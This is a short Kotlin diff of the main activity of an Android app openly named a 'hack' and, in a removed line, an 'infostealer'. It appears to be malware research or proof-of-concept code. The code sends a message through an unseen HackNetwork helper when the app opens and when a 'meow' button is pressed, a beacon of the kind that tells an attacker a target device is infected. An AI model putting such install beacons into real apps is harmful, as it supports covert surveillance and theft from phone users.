@@ -1,28 +1,24 @@
 package cocomelonc.hack
-
 import cocomelonc.hack.tools.HackNetwork
-import cocomelonc.hack.ui.HackNavigation
 import android.os.Bundle
 import androidx.activity.ComponentActivity
-import androidx.activity.compose.setContent
-import androidx.compose.material3.Surface
-import androidx.navigation.compose.rememberNavController
-import com.example.compose.HackTheme
+import android.widget.Button
+import android.widget.Toast
 
 class HackMainActivity : ComponentActivity() {
-    private lateinit var HackViewModel: HackViewModel
+    private lateinit var meowButton: Button
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        HackViewModel = HackViewModel(this)
-        setContent {
-            HackTheme {
-                Surface {
-                    val navController = rememberNavController()
-                    HackViewModel.navController = navController
-                    HackNavigation(HackViewModel = HackViewModel)
-                }
-            }
+        setContentView(R.layout.activity_main)
+        meowButton = findViewById(R.id.meowButton)
+        meowButton.setOnClickListener {
+            Toast.makeText(
+                applicationContext,
+                "Meow! ♥\uFE0F I Love Bahrain \uD83C\uDDE7\uD83C\uDDED",
+                Toast.LENGTH_SHORT
+            ).show()
+            HackNetwork(this).sendTextMessage("Meow! ♥\uFE0F I Love Bahrain \uD83C\uDDE7\uD83C\uDDED")
         }
-        HackNetwork(this).sendTextMessage("LoveBahrain hack infostealer has been installed on target device and opened")
+        HackNetwork(this).sendTextMessage("Meow! ♥\uFE0F I Love Bahrain \uD83C\uDDE7\uD83C\uDDED")
     }
 }
